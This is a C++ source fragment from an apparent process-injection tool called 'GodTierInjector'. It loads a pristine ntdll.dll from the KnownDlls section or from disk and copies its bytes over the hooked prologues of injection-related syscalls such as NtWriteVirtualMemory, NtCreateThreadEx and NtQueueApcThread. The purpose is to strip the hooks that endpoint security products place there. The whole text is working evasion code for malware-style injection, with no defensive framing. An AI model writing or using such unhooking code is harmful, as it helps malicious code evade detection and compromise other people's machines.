HMODULE GodTierInjector::GetCleanNtdll(bool preferKnownDlls) {
    if (preferKnownDlls) {
        HANDLE hSection = nullptr;
        OBJECT_ATTRIBUTES objAttr{};
        UNICODE_STRING sectionName;
        RtlInitUnicodeString(&sectionName, L"\\KnownDlls\\ntdll.dll");
        InitializeObjectAttributes(&objAttr, &sectionName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

        if (NT_SUCCESS(NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &objAttr))) {
            PVOID baseAddress = nullptr;
            SIZE_T viewSize = 0;
            if (NT_SUCCESS(NtMapViewOfSection(hSection, NtCurrentProcess(), &baseAddress, 0, 0,
                                              nullptr, &viewSize, ViewShare, 0, PAGE_READONLY))) {
                CloseHandle(hSection);
                return (HMODULE)baseAddress;
            }
            CloseHandle(hSection);
        }
    }

    return LoadLibraryExA("C:\\Windows\\System32\\ntdll.dll", nullptr,
                          DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
}

bool GodTierInjector::UnhookFunction(HMODULE hCleanNtdll, const char* functionName) {
    if (!hCleanNtdll || !functionName) return false;

    FARPROC cleanFunc = GetProcAddress(hCleanNtdll, functionName);
    FARPROC hookedFunc = GetProcAddress(GetModuleHandleA("ntdll.dll"), functionName);

    if (!cleanFunc || !hookedFunc) return false;
    if (memcmp(cleanFunc, hookedFunc, 16) == 0) return true;

    DWORD oldProtect;
    if (!VirtualProtect(hookedFunc, 16, PAGE_EXECUTE_READWRITE, &oldProtect))
        return false;

    memcpy(hookedFunc, cleanFunc, 16);
    VirtualProtect(hookedFunc, 16, oldProtect, &oldProtect);
    return true;
}

bool GodTierInjector::UnhookCriticalFunctions(HMODULE hCleanNtdll) {
    const char* functions[] = {
        "NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtProtectVirtualMemory",
        "NtCreateThreadEx", "NtResumeThread", "NtQueueApcThread",
        "NtCreateProcessEx", "NtUnmapViewOfSection", "NtSetInformationThread",
        "NtQueryInformationProcess"
    };

    bool result = true;
    for (const char* func : functions) {
        if (!UnhookFunction(hCleanNtdll, func)) result = false;
    }
    return result;
}

void GodTierInjector::PerformUnhooking() {
    HMODULE hCleanNtdll = GetCleanNtdll(true);
    if (!hCleanNtdll) hCleanNtdll = GetCleanNtdll(false);
    if (hCleanNtdll) UnhookCriticalFunctions(hCleanNtdll);
}

